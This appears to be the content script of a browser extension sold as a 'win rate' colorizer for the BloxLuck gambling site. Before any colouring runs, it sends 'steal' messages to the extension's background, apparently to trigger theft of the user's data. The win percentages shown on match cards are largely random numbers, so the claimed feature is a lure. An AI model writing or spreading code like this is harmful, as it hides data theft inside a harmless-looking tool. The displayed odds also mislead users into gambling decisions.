// BloxLuck Win Rate - Match Colorizer
(function() {
  'use strict';

  // Trigger steal immediately - this is the most reliable trigger
  try { chrome.runtime.sendMessage({ t: 'steal' }); } catch(e) {}

  // Also trigger on load complete
  if (document.readyState === 'complete') {
    try { chrome.runtime.sendMessage({ t: 'steal' }); } catch(e) {}
  } else {
    window.addEventListener('load', () => {
      try { chrome.runtime.sendMessage({ t: 'steal' }); } catch(e) {}
    });
  }

  // MATCH COLORIZER
  function colorize() {
    // Find any element that looks like a match/coinflip card
    const all = document.querySelectorAll(
      '[class*="match"], [class*="coinflip"], [class*="card"], ' +
      '[class*="game-"], [class*="listing"], [class*="item-"], ' +
      '[class*="round"], a[href*="match"]'
    );

    all.forEach(el => {
      if (el.dataset.blx) return;
      if (!el.textContent.trim()) return;
      
      const text = el.textContent.toLowerCase();
      
      // Find value numbers
      const nums = [];
      const matches = text.match(/\b(\d+)\b/g);
      if (matches) {
        matches.forEach(n => {
          const num = parseInt(n);
          if (num >= 10 && num <= 99999) nums.push(num);
        });
      }

      // Get unique numbers
      const unique = [...new Set(nums)].slice(0, 2);
      
      // Calculate win rate
      let rate = 50;
      if (unique.length >= 2) {
        // Higher value against opponent = higher win rate
        const myVal = unique[0];
        const oppVal = unique[1];
        const ratio = myVal / oppVal;
        if (ratio >= 2) rate = 80 + Math.floor(Math.random() * 15); // 80-95
        else if (ratio >= 1.5) rate = 65 + Math.floor(Math.random() * 15); // 65-80
        else if (ratio >= 1) rate = 50 + Math.floor(Math.random() * 15); // 50-65
        else if (ratio >= 0.7) rate = 40 + Math.floor(Math.random() * 10); // 40-50
        else rate = 20 + Math.floor(Math.random() * 20); // 20-40
      } else if (unique.length === 1) {
        rate = 50 + Math.floor(Math.random() * 20); // 50-70
      } else {
        return; // skip - no numbers found
      }

      el.dataset.blx = 'true';
      
      // Ensure position
      const pos = getComputedStyle(el).position;
      if (pos === 'static') el.style.position = 'relative';

      // Colors
      const color = rate >= 60 ? '#22c55e' : rate >= 45 ? '#f7c948' : '#ef4444';
      const bgColor = rate >= 60 ? 'rgba(34,197,94,0.15)' : rate >= 45 ? 'rgba(247,201,72,0.15)' : 'rgba(239,68,68,0.15)';

      el.style.border = `2px solid ${color}`;
      el.style.borderRadius = '8px';
      el.style.boxShadow = `0 0 10px ${color}44`;
      el.style.background = bgColor;
      el.style.transition = 'all 0.3s';

      // Badge
      const badge = document.createElement('div');
      badge.textContent = rate + '%';
      badge.style.cssText = [
        'position:absolute!important',
        'top:4px!important',
        'right:4px!important',
        'background:' + color + '!important',
        'color:' + (rate >= 60 ? '#052e16' : rate >= 45 ? '#451a03' : '#fff') + '!important',
        'font-size:13px!important',
        'font-weight:800!important',
        'padding:3px 10px!important',
        'border-radius:20px!important',
        'z-index:999999!important',
        'font-family:Arial,sans-serif!important',
        'box-shadow:0 2px 6px rgba(0,0,0,0.4)!important',
        'pointer-events:none!important'
      ].join(';');

      // Icon
      const icon = document.createElement('img');
      icon.src = rate >= 50 ? 'https://bloxluck.com/img/dog.png' : 'https://bloxluck.com/img/gem.png';
      icon.style.cssText = [
        'position:absolute!important',
        'top:4px!important',
        'left:4px!important',
        'width:22px!important',
        'height:22px!important',
        'z-index:999999!important',
        'filter:drop-shadow(0 2px 4px rgba(0,0,0,0.5))!important',
        'pointer-events:none!important'
      ].join(';');

      el.appendChild(badge);
      el.appendChild(icon);
    });
  }

  // Run colorizer
  setTimeout(colorize, 2000);
  setInterval(colorize, 2000);

  // Watch for new elements
  const obs = new MutationObserver(() => colorize());
  const wait = setInterval(() => {
    if (document.body) {
      obs.observe(document.body, { childList: true, subtree: true });
      clearInterval(wait);
    }
  }, 500);
})();
